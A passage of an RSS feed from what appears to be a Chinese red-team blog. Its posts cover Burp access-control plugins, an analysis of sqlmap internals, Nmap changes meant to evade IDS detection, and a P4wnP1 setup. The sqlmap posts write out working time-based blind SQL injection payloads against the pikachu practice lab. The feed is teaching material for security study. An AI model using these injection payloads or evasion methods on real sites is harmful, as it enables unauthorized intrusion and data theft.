alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;首先去https://www.jython.org/download.html下载jython并安装&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps50.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后在Option选项中选择刚刚安装的jython路径&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps51.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这时候在进入商店。刷新列表后即可进行安装&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps52.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装成功后即可在选项卡中看到Autorize&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps53.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在拦截数据包部分可以看到右键选项多了发送到Autorize&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps54.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;测试成功的项会变绿，即存在越权&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps55.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;autorepeater&#34;&gt;&lt;em&gt;AutoRepeater&lt;/em&gt;&lt;/h2&gt;&#xA;&lt;p&gt;这款工具和上述的差不多，都可以直接在Burp的插件商店里找到。安装完成后的效果和之前的差不多，会多一个选项卡&lt;/p&gt;&#xA;&lt;p&gt;可以把这个插件当做高级版的Repeater&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps56.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;同样通过右键发送到插件&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps57.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以在右边自定义一些过滤规则，在大批量发包的时候就不用一个个手工替换会方便很多。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps58.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;并且在多样化的规则中，这个工具同样可以测试越权，支持替换的cookie部分很多&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps59.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（二）——深入理解sqlmap(下)</title>
      <link>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8B/</link>
      <pubDate>Thu, 10 Dec 2020 02:11:09 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8B/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;在上篇中我们分析了sqlmap的部分检测逻辑，接下来介绍之前没讲完的部分，并且填上tamper这个坑。&lt;/p&gt;&#xA;&lt;p&gt;我们继续来分析盲注的逻辑，上篇分析的布尔型盲注，本篇分析时间盲注。&lt;/p&gt;&#xA;&lt;p&gt;还是拿靶场说事，先进行正常输入，可以看到相应时间，并且返回为I don’t care who you are.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps1.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;再来随便测试几个其他的输入，返回均为I don’t care who you are.即使输入特殊字符产生了错误也不会改变，在靶场中我们知道这是一个时间型盲注，但是在实战中可能往往想不到，那如何来验证是时间型盲注呢，这就需要用到sleep函数，sleep函数用于使查询延迟执行，我们可以在navicat中做样例演示，可以看到同样的一条select 123;语句执行时间不同&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps2.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;所以针对时间型盲注，要判断我们的输入是否执行，只需要加上sleep函数即可，在浏览器的开发人员工具的网络选项卡中，通过瀑布流的形式我们可以看到请求的时间，以下为输入lucy’and sleep (5)#的执行结果，可以看到执行时间超过了五秒&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps3.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;那是否所有的操作都会延迟呢，我们来试试输入一串明显报错的payload，在跟上了一串的单引号后可以看到请求时间明显缩短，说明payload未执行。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps4.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;根据之前布尔盲注的经验，我们同样可以进行判断，通过if语句判断为真才执行sleep语句，效果如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps5.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们所使用的payload为lucy&amp;rsquo; and if ((substr(version(),1,1))=&amp;lsquo;5&amp;rsquo;,sleep(5),null)#&lt;/p&gt;&#xA;&lt;p&gt;sqlmap中的时间盲注就比较简单了，代码如下：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps6.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这边看似简单是因为sqlmap使用了响应延迟判断技术，该种技术使用了前文提到的高斯分布，高斯分布可以识别一个响应是否与普通响应产生于一种机制。在sqlmap的xml文件中包含了各种攻击向量，其中常见的向量为&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps7.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;我们在案例中的测试也使用了其中一个向量，成功的向量如下图所示&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps8.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来我们具体分析一下数据包，以下为攻击完整过程的截图&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps9.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来就是紧张刺激的payload分析了，看看wireshark抓到的数据包，由于之前进行了大量其他测试，我们只需要分析time-based Injection即可。追踪到的第一个包是eq50分片&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps10.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;url经过转码后如下：&lt;/p&gt;&#xA;&lt;p&gt;/pikachu/vul/sqli/sqli_blind_t.php?name=123&amp;rsquo; AND (SELECT 1671 FROM (SELECT(SLEEP(5)))GSuc) AND &amp;lsquo;sRRR&amp;rsquo;=&amp;lsquo;sRRR&amp;amp;submit=查询&lt;/p&gt;&#xA;&lt;p&gt;此时控制台输出进行了两次询问，因为sqlmap疑似发现存在注入&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps11.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在这之前还有两次和上述相同的发包，应该是用于响应检测。之后就是一系列UNION select的探测，对应的是包含了orderby等参数，与控制台对应输出相同，即1-20列探测。&lt;/p&gt;&#xA;&lt;p&gt;从77组开始请求地址改变，根据之前的分析此时应该进入了误报检测&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml20628/wps12.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;以下记录为77开始的payload&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 3753 FROM (SELECT(SLEEP(5-(IF(57=57,0,5)))))Ndjp) AND &amp;#39;&lt;/span&gt;HxIh&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;HxIh&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 5365 FROM (SELECT(SLEEP(5-(IF(57=65,0,5)))))irpj) AND &amp;#39;&lt;/span&gt;YVSA&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;YVSA&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 7844 FROM (SELECT(SLEEP(5-(IF(57=98,0,5)))))lPgR) AND &amp;#39;&lt;/span&gt;YJgx&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;YJgx&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 9479 FROM (SELECT(SLEEP(5-(IF(98=65,0,5)))))ZaRe) AND &amp;#39;&lt;/span&gt;kXSW&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;kXSW&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 6042 FROM (SELECT(SLEEP(5-(IF(65=65,0,5)))))OReg) AND &amp;#39;&lt;/span&gt;EOyg&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;EOyg&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (SELECT 9179 FROM (SELECT(SLEEP(5-(IF(98 65,0,5)))))GkMV) AND &amp;#39;&lt;/span&gt;vZOZ&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;vZOZ&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而从85组开始又出现了新的变化&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（二）——深入理解sqlmap(上)</title>
      <link>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8A/</link>
      <pubDate>Wed, 02 Dec 2020 08:54:33 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%8C%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3sqlmap%E4%B8%8A/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;上一篇文章我们写了Nmap的分析与改造，本篇将继续分析炙手可热的工具sqlmap。这篇文章介绍的修改的东西不多，针对sqlmap的分析较多。剖析了sqlmap的大部分功能点和所有的检测逻辑，同时还会讲到tamper的分析以及tamper的编写。由于篇幅较长，为了避免大家看着难受，准备分为上下两篇来写。&lt;/p&gt;&#xA;&lt;p&gt;首先我们通过靶场环境构造漏洞场景，靶场为pikachu，github地址为：&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/zhuifengshaonianhanlu/pikachu&#34;&gt;https://github.com/zhuifengshaonianhanlu/pikachu&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;进入存在注入漏洞的页面&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps1.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进行抓包&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps2.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;丢进sqlmap可以看到能跑出结果&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps3.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进行一次完整的过程时监听流量并筛选&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps4.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在流量中我们可以很明显地发现会产生一长串的请求，筛选一下POST请求就能看到发送的payload&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps5.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这是简单的sqlmap发包内容，我们继续深入。&lt;/p&gt;&#xA;&lt;p&gt;很多人可能只了解了sqlmap的用法，甚至都不了解用法，参数只会-u -r &amp;ndash;level –risk几个，偶尔看了大佬的文章知道了&amp;ndash;tamper但是并不了解原理。接下来就给大家从多个方面来解析一下sqlmap这款神器。&lt;/p&gt;&#xA;&lt;p&gt;首先来看看针对靶场进行测试时的输出&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps6.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;第一行进行了包格式判断，如果无法识别将直接弹出错误并推出；接下来进行了连接测试，测试到目标的连接情况；然后进行WAF和IPS检测；再判断目标是否稳定；之后进行参数的动态性检测，启发式参数（xss等）测试；之后就开始了对包中可能存在的注入点的检测。&lt;/p&gt;&#xA;&lt;p&gt;我们对sqlmap的代码进行跟踪，首先第一环节为连接测试部分，对应代码在checks.py文件中&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps7.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;判断目标连接存活后开始进入下一环节，IPS和WAF的探测，核心代码也位于checks.py中，可以看到其中参考了http://seclists.org/nmap-dev/2011/q2/att-1005/http-waf-detect.nse&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps8.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;上面的参考链接是一个Nmap的脚本，也是我们上一篇文章中所说的，不过上一篇文章没有对NSE脚本的开发做深入介绍（下次一定补上。下次一定！）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;先来看一下脚本，我们发现主要是通过如下定义的两个攻击向量来进行检测的&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps10.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;上述的攻击向量包含了大多数常见的攻击类型，可以看到有目录穿越，敏感文件读取，SQL注入，PHP代码执行，XSS等方式，通常这几种payload会触发几乎所有防护软件的策略。可以看到在sqlmap中，payload也做了定义，定义在/lib/core/settings.py文件中，跟踪变量后可以看到其中的payload，与NSE脚本中的攻击向量相差无几。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps11.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;判断完WAF后就是对稳定性的检测，代码还是在checks.py中&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps12.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;该方式主要通过请求时间判断，在开头的注释中写道两次请求页面，判断不同请求的时间，而这个时间变量在跟踪后得到DELAY值超过0.5时即返回不稳定&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps13.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;启发式注入检测处于heuristicCheckSqlInjection方法中，启发式注入过程中，payload生成是由,&amp;rsquo;&amp;quot;().六种字符随机组成的长度为10的字符串，同时满足&amp;rsquo;和&amp;quot;都只有一个。启发式注入的目的就是让Web应用报错，如果Web应用开启了错误回显，就可以快速识别DBMS（正则匹配）。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps14.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来针对具体场景进行分析，我们在该案例之前的靶场中，具有如下显示，可以看到正常发包时正常回显，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps15.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;输入and 1=1以及and 1=2的测试判断是否存在注入&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps16.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps17.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;继续输入payload，进行列数判断&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps18.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps19.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;通过union select 1,2判断输出位置&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps20.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进一步获取数据（省略了爆表列名和字段名的操作）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps21.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;该种方式为union注入，是sqlmap中判断较为复杂的一种，因为脚本需要完成order by探测列数，select 判断列数，union select 1,2,&amp;hellip;判断输出位置，我们从代码来看sqlmap的UNION select检测逻辑，在checks.py中&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps22.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;跟进函数后发现检测文件位于/lib/techniques/union中&lt;/p&gt;&#xA;&lt;p&gt;列数判断，即order by判断&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps23.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;之后进行select null判断列数，&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ksohtml11944/wps24.jpg&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在进行该判断时经查sqlmap使用了网页相似度对比技术和高斯分布&lt;/p&gt;&#xA;&lt;p&gt;select null列数探测技术在进行时，会首先指定列数猜测过程中的最大值与最小值（指定列数 最少/最小值 为1，最多/最大值 为10），sqlmap会同时发送10个数据包，包含1个NULL至10个NULL，取回10个包的响应后进行网页相似度分析，并获取网页相似度数值（共10个，非True/False）。在这10个数值中，如果select null列数探测成功，那么成功那个响应的网页相似度数值只可能是最大值或者最小值。对10个数值中去除最大值和最小值后，留下8个值，可以认为，这8个值都是列数猜测不成功返回的响应，对这个8个数据进行高斯分布建模，得出的模型就是列数猜测不成功的模型。现在使用最大值或者最小值来计算是否符合这个不成功的模型，如果符合，说明这个数据也是列数猜测不成功的响应，如果不符合，说明这个数据也是列数猜测成功的响应。&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（一）——Nmap解析与改造</title>
      <link>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%80nmap%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%94%B9%E9%80%A0/</link>
      <pubDate>Fri, 27 Nov 2020 01:30:09 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%B8%80nmap%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%94%B9%E9%80%A0/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;所谓工欲善其事必先利其器，渗透过程同样如此，虽然大部分人的目标并不是想当一个脚本小子，甚至身边有不少朋友“不屑”用别人的工具非要自己写。然后就是各种抱怨：&lt;/p&gt;&#xA;&lt;p&gt;“我X，扫描器又挂了！”“这个注入为什么我这个工具跑不出来”“怎么TM又超时了”“日，我IP又被ban了”这时候就开始真香了，自己写的全丢了，简历开头阿D明小子样样精通，实际项目里上来就是nmap，sqlmap一把梭，上了shell就是菜刀蚁剑直接连。&lt;/p&gt;&#xA;&lt;p&gt;但是实际渗透过程当中，在针对大型目标的测试中可能并不一定好使，目标系统部署着IPS，IDS直接就可以识别常规扫描器，攻击工具的连接。&lt;/p&gt;&#xA;&lt;p&gt;今天的第一篇基础设施的改造，就是我们非常常见的Nmap，nmap是一款优秀的端口扫描工具，同时内部集成了非常多的NSE脚本，在全球开源贡献者和安全人员的努力下集成的脚本越来越多，可以实现的特定设备扫描方式也越来越多，支持的漏洞种类也越来越全面，甚至有的漏洞可以实现端口扫描-&amp;gt;服务探测-&amp;gt;漏洞验证-&amp;gt;漏洞利用-&amp;gt;提权一条龙的操作，是一款非常优秀的工具。在官方wiki中的解释如下：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Nmap (Network Mapper) is a free and open-source network scanner created by Gordon Lyon (also known by his pseudonym Fyodor Vaskovich).[3] Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. &#xD;&#xA;Nmap provides a number of features for probing computer networks, including host discovery and service and operating system detection. These features are extensible by scripts that provide more advanced service detection,[4] vulnerability detection,[4] and other features. Nmap can adapt to network conditions including latency and congestion during a scan. &#xD;&#xA;Nmap started as a Linux utility[5] and was ported to other systems including Windows, macOS, and BSD.[6] It is most popular on Linux, followed by Windows.[7] &#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;毕竟树大招风，现在越来越多的流量审计，IDS等设备都已经将Nmap的流量特征列入了重点监测对象。因此对流量的改造问题亟待解决，其中互联网上就有一份公开的流量特征检测规则样例，地址为：https://doc.emergingthreats.net/&lt;/p&gt;</description>
    </item>
    <item>
      <title>P4wnp1环境配置</title>
      <link>http://localhost:1313/posts/p4wnp1%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Thu, 26 Nov 2020 07:20:13 +0800</pubDate>
      <guid>http://localhost:1313/posts/p4wnp1%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
      <description>&lt;p&gt;&lt;strong&gt;本文所述的一切技术仅供网络安全研究学习之用，请勿用于任何的违法用途，否则由此所产生的一切后果自负！&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;准备工作：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;烧录软件（此处推荐balenaEtcher）&lt;/li&gt;&#xA;&lt;li&gt;读卡器（能读TF卡就行）&lt;/li&gt;&#xA;&lt;li&gt;树莓派镜像（因为各种原因导致很多版本都存在bug，经过测试选用了稳定版本raspbian jessie，2017-07-05-raspbian-jessie-lite.img）下载渠道为官方&lt;/li&gt;&#xA;&lt;li&gt;树莓派zero w&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;准备完成之后首先烧录系统，忘记截图了，凑合着看就行。烧录系统完成后将两个文件放到boot盘中，以启用SSH和WiFi自动连接&#xA;1.完全空的ssh文件（无后缀无内容，只需文件名为ssh即可）&#xA;2.wpa_supplicant.conf&#xA;内容如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;network&lt;span style=&#34;color:#f92672&#34;&gt;={&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ssid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;WiFi_name&amp;#34;&lt;/span&gt;        //此处填写WiFi名称&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    psk&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;          //此处填写WiFi密码&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    key_mgmt&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;WPA-PSK        //此处填写加密方式&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    priority&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    scan_ssid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完成后将系统卡插入树莓派，给树莓派上电。等待连接，WiFi尽量选择自己能控制的，比如手机热点，可以直接看到连接情况，便于直接获取树莓派IP地址。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/8d82f532-8f04-4c48-a344-f3f2b6bbc719.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;连接完成后通过ssh访问树莓派。默认登录信息为pi/raspberry&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/d90e43dc-d6cc-406d-b2d8-4ba3fe76550e.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来要做的事是切换系统软件更新源&#xA;首先提升到管理员权限方便操作&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre 